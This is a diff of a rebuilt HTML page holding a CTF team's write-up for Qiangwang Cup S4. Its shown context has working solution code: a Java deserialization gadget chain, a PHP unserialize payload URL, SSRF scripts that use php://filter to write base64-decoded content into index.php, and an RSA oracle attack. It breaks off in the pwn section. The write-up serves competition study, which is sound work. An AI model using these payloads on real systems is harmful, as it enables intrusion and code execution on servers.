@@ -12,7 +12,7 @@
  
 
 
-      <title>强网杯 S4 SU Write-Up - </title>
+      <title>强网杯 S4 SU Write-Up - su-team</title>
 
   <meta name="description" content="本次强网杯比赛我们 SU 取得了线上赛 12th 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
 以下是我们 SU 本次 强网杯 S4 的 writeup">
@@ -66,7 +66,7 @@
   "headline": "强网杯 S4 SU Write-Up",
   "description" : "本次强网杯比赛我们 SU 取得了线上赛 12th 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com\n以下是我们 SU 本次 强网杯 S4 的 writeup\n",
   "inLanguage" : "en",
-  "wordCount":  6443 ,
+  "wordCount":  5099 ,
   "datePublished" : "2020-08-24T21:00:00\u002b08:00",
   "dateModified" : "2020-08-24T21:00:00\u002b08:00",
   "image" : "http:\/\/localhost:1313\/img\/SU.jpg",
@@ -104,55 +104,21 @@
   <link rel="alternate" href="http://localhost:1313/index.xml" type="application/rss+xml" title="su-team"><link rel="stylesheet" href="http://localhost:1313/css/katex.min.css" />
   <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/brands.min.css" />
   <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/fontawesome.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/regular.min.css" />
   <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/solid.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/svg.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/svg-with-js.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/v4-font-face.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/v4-shims.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/fontawesome/css/v5-font-face.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/css/bootstrap.min.css" /><link rel="stylesheet" href="http://localhost:1313/css/main.css" /><link rel="stylesheet" href="http://localhost:1313/css/fonts.css" /><link rel="stylesheet" href="http://localhost:1313/css/syntax.css" /><link rel="stylesheet" href="http://localhost:1313/css/codeblock.css?v=20260212-fix3" /><link rel="stylesheet" href="http://localhost:1313/css/photoswipe.min.css" />
-  <link rel="stylesheet" href="http://localhost:1313/css/photoswipe.default-skin.min.css" /><style>
- 
-.navbar-custom .avatar-container {
-  width: 58px;
-  height: 58px;
-  margin-top: -29px;  
-  left: 50%;
-  transform: translateX(-50%);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  background: #fff;
-  border-radius: 50%;
-  box-shadow: 0 6px 18px rgba(0, 0, 0, 0.12);
-}
+  <link rel="stylesheet" href="http://localhost:1313/css/bootstrap.min.css" /><link rel="stylesheet" href="http://localhost:1313/css/main.css" /><link rel="stylesheet" href="http://localhost:1313/css/fonts.css" /><link rel="stylesheet" href="http://localhost:1313/css/syntax.css" /><link rel="stylesheet" href="http://localhost:1313/css/codeblock.css?v=20260322-1" /><link rel="stylesheet" href="http://localhost:1313/css/photoswipe.min.css" />
+  <link rel="stylesheet" href="http://localhost:1313/css/photoswipe.default-skin.min.css" /><script>
+  (function() {
+    var theme = "dark";
+    try {
+      theme = localStorage.getItem("theme") || "dark";
+    } catch (e) {
+      theme = "dark";
+    }
+    document.documentElement.setAttribute("data-theme", theme === "light" ? "light" : "dark");
+  })();
+</script>
+<link rel="stylesheet" href="/css/team-theme.css?v=20260322-6">
 
-.navbar-custom .avatar-container .avatar-img-border {
-  width: 100%;
-  height: 100%;
-  border-radius: 50%;
-  overflow: hidden;
-  margin: 0;
-  box-shadow: none;
-}
-
-.navbar-custom .avatar-container .avatar-img {
-  width: 100%;
-  height: 100%;
-  object-fit: cover;
-  border-radius: 50%;
-}
-
- 
-@media only screen and (min-width: 768px) {
-  .navbar-custom .avatar-container {
-    width: 72px;
-    height: 72px;
-    margin-top: -36px;  
-  }
-}
-</style>
   </head>
   <body>
     <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
@@ -164,12 +130,17 @@
         <span class="icon-bar"></span>
         <span class="icon-bar"></span>
       </button>
-      <a class="theme-toggle mobile-theme-toggle" href="javascript:void(0)" onclick="toggleTheme()" title="Toggle Theme">
-        <span class="sr-only">Toggle Theme</span>
-        <svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+
+      <a class="navbar-brand" href="/">
+        <span class="navbar-brand__title">su-team</span>
+        <span class="navbar-brand__meta">battle log</span>
+      </a>
+
+      <button type="button" class="theme-toggle mobile-theme-toggle hidden-sm hidden-md hidden-lg" onclick="toggleTheme()" aria-label="Toggle theme">
+        <svg class="theme-icon-moon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
           <path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"></path>
         </svg>
-        <svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <svg class="theme-icon-sun" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
           <circle cx="12" cy="12" r="5"></circle>
           <line x1="12" y1="1" x2="12" y2="3"></line>
           <line x1="12" y1="21" x2="12" y2="23"></line>
@@ -180,8 +151,7 @@
           <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
           <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
         </svg>
-      </a>
-      <a class="navbar-brand" href="http://localhost:1313/">su-team</a>
+      </button>
     </div>
 
     <div class="collapse navbar-collapse" id="main-navbar">
@@ -221,13 +191,12 @@
 
         
 
-        <li class="hidden-xs">
-          <a href="javascript:void(0)" class="theme-toggle" onclick="toggleTheme()" title="Toggle Theme">
-            <span class="sr-only">Toggle Theme</span>
-            <svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <li class="nav-theme-toggle hidden-xs">
+          <button type="button" class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle theme">
+            <svg class="theme-icon-moon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
               <path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"></path>
             </svg>
-            <svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <svg class="theme-icon-sun" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
               <circle cx="12" cy="12" r="5"></circle>
               <line x1="12" y1="1" x2="12" y2="3"></line>
               <line x1="12" y1="21" x2="12" y2="23"></line>
@@ -238,8 +207,9 @@
               <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
               <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
             </svg>
-          </a>
+          </button>
         </li>
+
         
       </ul>
     </div>
@@ -248,93 +218,20 @@
       
       
     
-
   </div>
 </nav>
+
 <script>
-  (function() {
-    const storedTheme = localStorage.getItem("theme");
-    const prefersDark = window.matchMedia("(prefers-color-scheme: dark)").matches;
-    if (storedTheme === "dark" || (!storedTheme && prefersDark)) {
-      document.body.classList.add("dark-mode");
-    } else {
-      document.body.classList.remove("dark-mode");
-    }
-  })();
   function toggleTheme() {
-    const body = document.body;
-    body.classList.toggle("dark-mode");
-    if (body.classList.contains("dark-mode")) {
-      localStorage.setItem("theme", "dark");
-    } else {
-      localStorage.setItem("theme", "light");
-    }
+    var root = document.documentElement;
+    var current = root.getAttribute("data-theme") === "light" ? "light" : "dark";
+    var next = current === "dark" ? "light" : "dark";
+    root.setAttribute("data-theme", next);
+    try {
+      localStorage.setItem("theme", next);
+    } catch (e) {}
   }
 </script>
-<style>
-  .theme-toggle {
-    cursor: pointer;
-    padding: 15px;
-    display: flex;
-    align-items: center;
-  }
-  .mobile-theme-toggle {
-    float: right;
-    padding: 15px 10px;
-    margin-top: 2px;
-  }
-  @media (min-width: 768px) {
-    .mobile-theme-toggle {
-      display: none !important;
-    }
-  }
-  .theme-icon-moon,
-  .theme-icon-sun {
-    color: #777;
-    transition: color .3s, transform .3s;
-  }
-  .theme-toggle:hover .theme-icon-moon,
-  .theme-toggle:hover .theme-icon-sun {
-    color: #333;
-  }
-  .theme-icon-sun {
-    display: none;
-  }
-  .theme-icon-moon {
-    display: block;
-  }
-  body.dark-mode .theme-icon-sun {
-    display: block;
-    color: #000;
-  }
-  body.dark-mode .theme-icon-moon {
-    display: none;
-  }
-  body.dark-mode {
-    filter: none !important;
-    background-color: #1a1a1a !important;
-  }
-  body.dark-mode header,
-  body.dark-mode .container,
-  body.dark-mode footer {
-    filter: invert(1) hue-rotate(180deg);
-  }
-  body.dark-mode .navbar-custom {
-    background-color: #1a1a1a !important;
-    border-bottom: 1px solid #333;
-  }
-  body.dark-mode .navbar-custom .container-fluid {
-    filter: invert(1) hue-rotate(180deg);
-  }
-  body.dark-mode img,
-  body.dark-mode video,
-  body.dark-mode iframe,
-  body.dark-mode .avatar-img,
-  body.dark-mode .navbar-custom .avatar-container {
-    filter: invert(1) hue-rotate(180deg);
-  }
-</style>
-
 
 
 
@@ -420,10 +317,10 @@
   <i class="fas fa-calendar"></i>&nbsp;Posted on August 24, 2020
   
   
-    &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;31&nbsp;min
+    &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;24&nbsp;min
   
   
-    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;6443&nbsp;words
+    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;5099&nbsp;words
   
   
     
@@ -445,14 +342,15 @@
 
 
     
-<div class="container" role="main">
-  
-  <div class="row flex-row">
-    <div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs">
-      <div class="toc-sidebar">
-        <h4 class="toc-title">#<br>TABLE OF CONTENTS</h4>
-        <div class="toc-card">
-          
+
+
+<div class="container post-layout" role="main">
+  <div class="row flex-row post-layout__row">
+    
+      <div class="col-lg-3 col-md-3 hidden-sm hidden-xs">
+        <aside class="toc-sidebar">
+          <h4 class="toc-title">Table of Contents</h4>
+          <div class="toc-card">
             <nav id="TableOfContents">
   <ul>
     <li>
@@ -514,75 +412,20 @@
     </li>
   </ul>
 </nav>
-          
-        </div>
+          </div>
+        </aside>
       </div>
-    </div>
-    <div class="col-lg-9 col-md-9">
-  
-      <article role="main" class="blog-post">
-        <p>本次强网杯比赛我们 SU 取得了线上赛 12th 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:suers_xctf@126.com">suers_xctf@126.com</a></p>
+      <div class="col-lg-9 col-md-9 post-layout__main">
+    
+
+        <section class="article-shell">
+          <article role="main" class="blog-post">
+            <p>本次强网杯比赛我们 SU 取得了线上赛 12th 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:suers_xctf@126.com">suers_xctf@126.com</a></p>
 <p>以下是我们 SU 本次 强网杯 S4 的 writeup</p>
 <h2 id="web">Web</h2>
 <h3 id="easy_java">easy_java</h3>
 <p>绕一下过滤就行</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">package</span> <span class="n">ysoserial</span><span class="o">.</span><span class="n">payloads</span><span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">package</span> <span class="n">ysoserial</span><span class="o">.</span><span class="n">payloads</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">commons</span><span class="o">.</span><span class="n">collections</span><span class="o">.</span><span class="n">Transformer</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">commons</span><span class="o">.</span><span class="n">collections</span><span class="o">.</span><span class="n">bag</span><span class="o">.</span><span class="n">AbstractMapBag</span><span class="p">;</span>
@@ -634,33 +477,9 @@
 </span></span><span class="line"><span class="cl">        <span class="n">oos</span><span class="o">.</span><span class="n">writeObject</span><span class="p">(</span><span class="n">hashMap</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="dice2cry">dice2cry</h3>
+</span></span></code></pre></div><h3 id="dice2cry">dice2cry</h3>
 <p>http://106.14.66.189/abi.php.bak 得到源码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
 </span></span><span class="line"><span class="cl">session_start();
 </span></span><span class="line"><span class="cl">header(&#34;Content-type:text/html;charset=utf-8&#34;);
 </span></span><span class="line"><span class="cl">
@@ -678,61 +497,9 @@
 </span></span><span class="line"><span class="cl">        $json_obj = json_encode($dice);
 </span></span><span class="line"><span class="cl">        echo $json_obj;
 </span></span><span class="line"><span class="cl">?&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>可以看到 <a href="https://github.com/php/php-src/commit/fc4d462e947828fdbeac6020ac8f34704a218834">https://github.com/php/php-src/commit/fc4d462e947828fdbeac6020ac8f34704a218834</a> 这次 commit 修了一个bug，我们可以用<code>[</code>绕过 php 对点的转换。web 部分结束
+</span></span></code></pre></div><p>可以看到 <a href="https://github.com/php/php-src/commit/fc4d462e947828fdbeac6020ac8f34704a218834">https://github.com/php/php-src/commit/fc4d462e947828fdbeac6020ac8f34704a218834</a> 这次 commit 修了一个bug，我们可以用<code>[</code>绕过 php 对点的转换。web 部分结束
 密码学部分：RSA LSB Oracle，不过是mod 3的。把区间改一改就行了</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
@@ -778,44 +545,12 @@
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">pow</span><span class="p">(</span><span class="n">low</span><span class="o">+</span><span class="n">diff</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span> <span class="o">==</span> <span class="n">c</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">diff</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">        <span class="k">break</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://i.loli.net/2020/08/23/f4cTxE8ZLg79o5W.jpg" alt=""></p>
+</span></span></code></pre></div><p><img src="https://i.loli.net/2020/08/23/f4cTxE8ZLg79o5W.jpg" alt=""></p>
 <h3 id="half_infiltration">half_infiltration</h3>
 <p>http://39.98.131.124/</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">view-source:http://39.98.131.124/?x=a:2:{i:0;O:4:%22User%22:3:{s:3:%22age%22;O:4:%22Pass%22:0:{}s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:6:%22result%22;}i:1;O:4:%22User%22:3:{s:3:%22age%22;O:4:%22Pass%22:0:{}s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:4:%22this%22;}}
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>通过<code>$this</code>让 php 产生 fatal error 打破 <code>obstart</code> 得到源码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">view-source:http://39.98.131.124/?x=a:2:{i:0;O:4:%22User%22:3:{s:3:%22age%22;O:4:%22Pass%22:0:{}s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:6:%22result%22;}i:1;O:4:%22User%22:3:{s:3:%22age%22;O:4:%22Pass%22:0:{}s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:4:%22this%22;}}
+</span></span></code></pre></div><p>通过<code>$this</code>让 php 产生 fatal error 打破 <code>obstart</code> 得到源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
 </span></span><span class="line"><span class="cl"><span class="c1">//经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网
 </span></span></span><span class="line"><span class="cl">    <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;we_have_done_ssrf_here_could_you_help_to_continue_it&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="k">false</span><span class="p">;</span> 
 </span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|var|apache|conf|proc|log/i&#34;</span> <span class="p">,</span><span class="nv">$url</span><span class="p">)){</span>
@@ -834,41 +569,7 @@
 </span></span><span class="line"><span class="cl">     <span class="p">}</span> 
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nv">$header</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;</span><span class="dl">EOF</span><span class="s">
@@ -896,49 +597,8 @@
 </span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$payload</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$payload</span> <span class="o">=</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nx">system</span><span class="p">(</span><span class="s2">&#34;curl -vv http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=</span><span class="si">$payload</span><span class="s2">&#34;</span><span class="p">);</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>content 貌似是对 &lt;? php = 有关键字过滤，含有这些的就会被 404 ，猜测是用了<code>file_put_contents</code>，并且它支持 php 伪协议写文件，所以可以尝试用 base64 进行绕过</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span></code></pre></div><p>content 貌似是对 &lt;? php = 有关键字过滤，含有这些的就会被 404 ，猜测是用了<code>file_put_contents</code>，并且它支持 php 伪协议写文件，所以可以尝试用 base64 进行绕过</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">get_payload</span><span class="p">(</span><span class="nv">$session</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nv">$content</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$header</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;</span><span class="dl">EOF</span><span class="s">
@@ -973,22 +633,13 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nv">$payload</span> <span class="o">=</span> <span class="nx">get_payload</span><span class="p">(</span><span class="s2">&#34;test222&#34;</span><span class="p">,</span> <span class="s2">&#34;php://filter/convert.base64-decode/resource=index.php&#34;</span><span class="p">,</span> <span class="nv">$content1</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=</span><span class="si">$payload</span><span class="s2">&#34;</span><span class="p">);</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="pwn">Pwn</h2>
+</span></span></code></pre></div><h2 id="pwn">Pwn</h2>
 <h3 id="qwblogin">qwblogin</h3>
 <p>先逆向过pow,前三个字节直接爆破出来QWQ。之后下断看到是断在了read 0x21的地方。
 随便输点东西，跟着后面调试外加看ida的反编译加看官方文档大体可以看出来是将输入的东西分为4组，每组8字节，分别跟一些固定的数字xor，随后cmp对比。
 逆向下来是这样的字符串</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;G00DR3VR&#39;+&#39;W31LD0N3&#39;+&#39;Try2Pwn!&#39;+&#39;GOGOGOGO&#39;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>之后会再进入一个read流程，下断可以看出来是read 0 stack 0x800。stack为程序虚拟的栈空间。
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;G00DR3VR&#39;+&#39;W31LD0N3&#39;+&#39;Try2Pwn!&#39;+&#39;GOGOGOGO&#39;
+</span></span></code></pre></div><p>之后会再进入一个read流程，下断可以看出来是read 0 stack 0x800。stack为程序虚拟的栈空间。
 跟c类似的是，这个存在栈溢出。所以最后类似这种形式 0x100*&lsquo;a&rsquo;+p64(rbp)+p64(ret_addr)
